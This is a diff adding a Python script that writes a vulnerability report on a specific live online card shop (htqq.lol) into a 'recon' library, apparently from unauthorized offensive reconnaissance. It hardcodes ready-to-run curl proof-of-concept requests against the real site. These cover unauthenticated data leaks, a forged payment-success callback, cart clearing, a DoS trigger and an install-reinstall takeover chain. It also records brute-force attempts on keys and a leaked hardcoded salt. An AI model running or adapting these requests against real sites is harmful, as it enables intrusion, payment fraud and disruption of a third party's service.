@@ -1,0 +1,324 @@
+#!/usr/bin/env python3
+"""将 htqq.lol 漏洞清单写入彩虹发卡 recon 库 (/data/recon/<domain>/rev/audit/)."""
+from __future__ import annotations
+
+import json
+from datetime import datetime, timezone
+from pathlib import Path
+
+TARGET = "https://htqq.lol/shop/"
+DOMAIN = "htqq.lol"
+TS = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")
+
+FINDINGS = [
+    {
+        "id": "H1",
+        "severity": "HIGH",
+        "category": "info_disclosure",
+        "title": "getcount 未授权泄露经营数据",
+        "detail": "orders=18043 money=5810471.4 site=674，无需登录",
+        "endpoint": "GET /shop/ajax.php?act=getcount",
+        "exploitable": True,
+        "poc": 'curl -sk -H "X-Requested-With: XMLHttpRequest" -H "Referer: https://htqq.lol/shop/" "https://htqq.lol/shop/ajax.php?act=getcount"',
+        "evidence": {
+            "code": 0,
+            "orders": "18043",
+            "orders1": "18020",
+            "orders2": "51",
+            "money": 5810471.4,
+            "money1": 15021,
+            "site": "674",
+            "cart_count": "0",
+        },
+        "ts": TS,
+    },
+    {
+        "id": "H2",
+        "severity": "HIGH",
+        "category": "idor",
+        "title": "order 卡密 IDOR（需 skey）",
+        "detail": "POST ajax.php?act=order {id,skey} 返回 kminfo；18000+ 订单，skey 暴力未中",
+        "endpoint": "POST /shop/ajax.php?act=order",
+        "exploitable": False,
+        "poc": 'curl -sk -X POST -H "Referer: https://htqq.lol/shop/?mod=query" -d "id=18043&skey=TEST" "https://htqq.lol/shop/ajax.php?act=order"',
+        "evidence": {"response": "验证失败", "orders_total": "18043", "csrf_whitelist": True},
+        "ts": TS,
+    },
+    {
+        "id": "H3",
+        "severity": "HIGH",
+        "category": "crypto",
+        "title": "hashsalt 前端硬编码",
+        "detail": "JSFuck 解码后固定值，用于 pay/cancel/cart_buy/cart_cancel",
+        "endpoint": "前端 faka.js / cart.js",
+        "exploitable": True,
+        "poc": None,
+        "evidence": {"hashsalt": "345a36b5fa7be2bdd2f1724157952938"},
+        "ts": TS,
+    },
+    {
+        "id": "H4",
+        "severity": "HIGH",
+        "category": "payment",
+        "title": "支付回调接口公网暴露",
+        "detail": "epay/alipay/wx/qq notify + submit + getshop 可达，签名伪造未成功",
+        "endpoint": "/shop/other/*_notify.php, submit.php, getshop.php",
+        "exploitable": False,
+        "poc": 'curl -sk -X POST -d "trade_no=1&trade_status=TRADE_SUCCESS" "https://htqq.lol/shop/other/epay_notify.php"',
+        "evidence": {"epay_notify": "error"},
+        "ts": TS,
+    },
+    {
+        "id": "H5",
+        "severity": "HIGH",
+        "category": "cron",
+        "title": "cron.php 公网可访问",
+        "detail": "返回「监控密钥不正确」，40+ 密钥字典未中",
+        "endpoint": "GET /shop/cron.php",
+        "exploitable": False,
+        "poc": 'curl -sk "https://htqq.lol/shop/cron.php"',
+        "evidence": {"response": "监控密钥不正确"},
+        "ts": TS,
+    },
+    {
+        "id": "H6",
+        "severity": "HIGH",
+        "category": "install",
+        "title": "install 重装接管链",
+        "detail": "install/ 可读，install.lock 可访问；删锁可重装",
+        "endpoint": "/shop/install/, /shop/install/install.lock",
+        "exploitable": False,
+        "poc": 'curl -sk "https://htqq.lol/shop/install/index.php"',
+        "evidence": {"message": "删除 install.lock 后再安装"},
+        "ts": TS,
+    },
+    {
+        "id": "H7",
+        "severity": "HIGH",
+        "category": "admin",
+        "title": "sup 供货商后台暴露",
+        "detail": "/shop/sup/ 含 fakalist 卡密库存，登录需 Geetest",
+        "endpoint": "/shop/sup/login.php, fakalist.php",
+        "exploitable": False,
+        "poc": 'curl -sk "https://htqq.lol/shop/sup/login.php"',
+        "evidence": {"paths": ["sup/login.php", "sup/fakalist.php", "sup/list.php"]},
+        "ts": TS,
+    },
+    {
+        "id": "H8",
+        "severity": "MEDIUM",
+        "category": "logic",
+        "title": "gettoolnew cid 过滤失效",
+        "detail": "任意 cid 返回相同 9 商品；gettool 正常 49 SKU",
+        "endpoint": "GET /shop/ajax.php?act=gettoolnew&cid=*",
+        "exploitable": True,
+        "poc": 'curl -sk "https://htqq.lol/shop/ajax.php?act=gettoolnew&cid=1" -H "Referer: https://htqq.lol/shop/"',
+        "evidence": {"note": "cid=1 与 cid=99 响应相同"},
+        "ts": TS,
+    },
+    {
+        "id": "H9",
+        "severity": "HIGH",
+        "category": "csrf",
+        "title": "cart_empty 未授权清空购物车",
+        "detail": "GET 无 CSRF；仅需同源 Referer；csrf.js 不拦截 GET",
+        "endpoint": "GET /shop/ajax.php?act=cart_empty",
+        "exploitable": True,
+        "poc": 'curl -sk -H "Referer: https://htqq.lol/shop/?mod=cart" "https://htqq.lol/shop/ajax.php?act=cart_empty"',
+        "evidence": {"code": 0, "msg": "清空购物车成功！"},
+        "ts": TS,
+    },
+    {
+        "id": "H10",
+        "severity": "HIGH",
+        "category": "dos",
+        "title": "query 数字订单号触发 HTTP 500",
+        "detail": "YYYYMMDDHHMMSS 格式触发 500 空 body，可 DoS query 接口",
+        "endpoint": "POST /shop/ajax.php?act=query",
+        "exploitable": True,
+        "poc": 'curl -sk -X POST -H "Referer: https://htqq.lol/shop/?mod=query" -d "qq=20250713180000&type=1" "https://htqq.lol/shop/ajax.php?act=query"',
+        "evidence": {"status": 500, "payload": "20250713180000"},
+        "ts": TS,
+    },
+    {
+        "id": "M1",
+        "severity": "MEDIUM",
+        "category": "info_disclosure",
+        "title": "gettool/getclass 商品 API 全量泄露",
+        "detail": "49 SKU + 9 分类无需登录",
+        "endpoint": "GET /shop/ajax.php?act=gettool|getclass",
+        "exploitable": True,
+        "poc": 'curl -sk "https://htqq.lol/shop/ajax.php?act=gettool&cid=7" -H "Referer: https://htqq.lol/shop/"',
+        "evidence": {"sku_count": 49, "class_count": 9},
+        "ts": TS,
+    },
+    {
+        "id": "M2",
+        "severity": "MEDIUM",
+        "category": "captcha",
+        "title": "Geetest gt/challenge 泄露",
+        "detail": "ajax.php?act=captcha 返回完整 Geetest 配置",
+        "endpoint": "GET /shop/ajax.php?act=captcha",
+        "exploitable": True,
+        "poc": 'curl -sk "https://htqq.lol/shop/ajax.php?act=captcha" -H "Referer: https://htqq.lol/shop/"',
+        "evidence": {"gt": "a1017fd4951689c5d20317c165c1c318"},
+        "ts": TS,
+    },
+    {
+        "id": "M3",
+        "severity": "MEDIUM",
+        "category": "session",
+        "title": "ajax_chat session_id 泄露",
+        "detail": "user/ajax_chat.php?act=get 返回 session_id",
+        "endpoint": "GET /shop/user/ajax_chat.php?act=get",
+        "exploitable": False,
+        "poc": 'curl -sk "https://htqq.lol/shop/user/ajax_chat.php?act=get"',
+        "evidence": {"session_id": "9", "data": []},
+        "ts": TS,
+    },
+    {
+        "id": "M4",
+        "severity": "MEDIUM",
+        "category": "cart",
+        "title": "cart_list/cart_info 未授权可读",
+        "detail": "无需登录可读购物车列表（当前为空）",
+        "endpoint": "GET /shop/ajax.php?act=cart_list|cart_info",
+        "exploitable": True,
+        "poc": 'curl -sk "https://htqq.lol/shop/ajax.php?act=cart_list" -H "Referer: https://htqq.lol/shop/?mod=cart"',
+        "evidence": {"code": 0, "count": 0},
+        "ts": TS,
+    },
+    {
+        "id": "M5",
+        "severity": "MEDIUM",
+        "category": "cart",
+        "title": "cart_shop_item/del IDOR 攻击面（未复现）",
+        "detail": "id 1-500 全返回商品不存在；需真实 shop_id",
+        "endpoint": "POST /shop/ajax.php?act=cart_shop_item|cart_shop_del",
+        "exploitable": False,
+        "poc": None,
+        "evidence": {"scan_range": "1-500", "result": "商品不存在"},
+        "ts": TS,
+    },
+    {
+        "id": "M6",
+        "severity": "INFO",
+        "category": "waf",
+        "title": "Cloudflare + _guard WAF",
+        "detail": "高频扫描触发滑块/TLS reset；SQLi 关键字被 360 安全狗拦截",
+        "endpoint": "/_guard/",
+        "exploitable": False,
+        "poc": None,
+        "evidence": {"challenge": "Click to continue!"},
+        "ts": TS,
+    },
+    {
+        "id": "M7",
+        "severity": "INFO",
+        "category": "api",
+        "title": "api.php IDOR 不适用",
+        "detail": "api.php?act=search 连接重置；非 qq8.one 型 api IDOR",
+        "endpoint": "GET /shop/api.php?act=search&id=1",
+        "exploitable": False,
+        "poc": None,
+        "evidence": {"note": "彩虹 playbook api.php IDOR 未命中"},
+        "ts": TS,
+    },
+]
+
+
+def count_severity(findings: list[dict]) -> dict[str, int]:
+    c = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
+    for f in findings:
+        sev = f.get("severity", "INFO")
+        c[sev] = c.get(sev, 0) + 1
+    return c
+
+
+def render_report_md(report: dict) -> str:
+    lines = [
+        f"# {DOMAIN} 彩虹发卡漏洞报告",
+        "",
+        f"- Target: {TARGET}",
+        f"- Updated: {report['ts']}",
+        f"- Orders: {report['orders']} | Subsites: {report['subsites']}",
+        f"- Findings: {report['findings_count']} "
+        f"(CRITICAL: {report['critical']}, HIGH: {report['high']}, MEDIUM: {report['medium']})",
+        "",
+        "## 漏洞汇总",
+        "",
+        "| ID | 等级 | 漏洞 | 可利用 |",
+        "|----|------|------|--------|",
+    ]
+    for f in report["findings"]:
+        exp = "✅" if f.get("exploitable") else "⚠️"
+        lines.append(f"| {f.get('id','')} | {f['severity']} | {f['title']} | {exp} |")
+    lines.append("")
+    for f in report["findings"]:
+        lines.extend([
+            f"## [{f['severity']}] {f.get('id', '')} {f['title']}",
+            "",
+            f"- **端点:** `{f.get('endpoint', '')}`",
+            f"- **详情:** {f['detail']}",
+            f"- **可利用:** {'是' if f.get('exploitable') else '否/待突破'}",
+        ])
+        if f.get("poc"):
+            lines.extend(["", "```bash", f["poc"], "```"])
+        lines.append("")
+    return "\n".join(lines)
+
+
+def main() -> None:
+    import argparse
+
+    ap = argparse.ArgumentParser(description="保存漏洞到彩虹 recon 库")
+    ap.add_argument(
+        "--out",
+        default=f"/data/recon/{DOMAIN}/rev/audit",
+        help="输出目录 (默认 /data/recon/htqq.lol/rev/audit)",
+    )
+    args = ap.parse_args()
+    out = Path(args.out)
+    out.mkdir(parents=True, exist_ok=True)
+
+    orders = int(FINDINGS[0]["evidence"].get("orders", 0))
+    subsites = int(FINDINGS[0]["evidence"].get("site", 0))
+    counts = count_severity(FINDINGS)
+
+    report = {
+        "target": TARGET,
+        "domain": DOMAIN,
+        "framework": "独角/彩虹发卡",
+        "ts": TS,
+        "orders": orders,
+        "subsites": subsites,
+        "findings_count": len(FINDINGS),
+        "critical": counts["CRITICAL"],
+        "high": counts["HIGH"],
+        "medium": counts["MEDIUM"],
+        "low": counts["LOW"],
+        "info": counts["INFO"],
+        "exploitable_count": sum(1 for f in FINDINGS if f.get("exploitable")),
+        "findings": FINDINGS,
+    }
+
+    (out / "findings.json").write_text(
+        json.dumps(FINDINGS, ensure_ascii=False, indent=2) + "\n", encoding="utf-8"
+    )
+    (out / "REPORT.json").write_text(
+        json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8"
+    )
+    (out / "REPORT.md").write_text(render_report_md(report), encoding="utf-8")
+    (out / "FULL_VULN_REPORT.md").write_text(render_report_md(report), encoding="utf-8")
+
+    reports_dir = out.parent.parent / "reports"
+    reports_dir.mkdir(parents=True, exist_ok=True)
+    (reports_dir / "VULN_REPORT.md").write_text(render_report_md(report), encoding="utf-8")
+
+    print(f"saved {len(FINDINGS)} findings -> {out}")
+    print(f"  findings.json, REPORT.json, REPORT.md, FULL_VULN_REPORT.md")
+    print(f"  reports/VULN_REPORT.md")
+
+
+if __name__ == "__main__":
+    main()
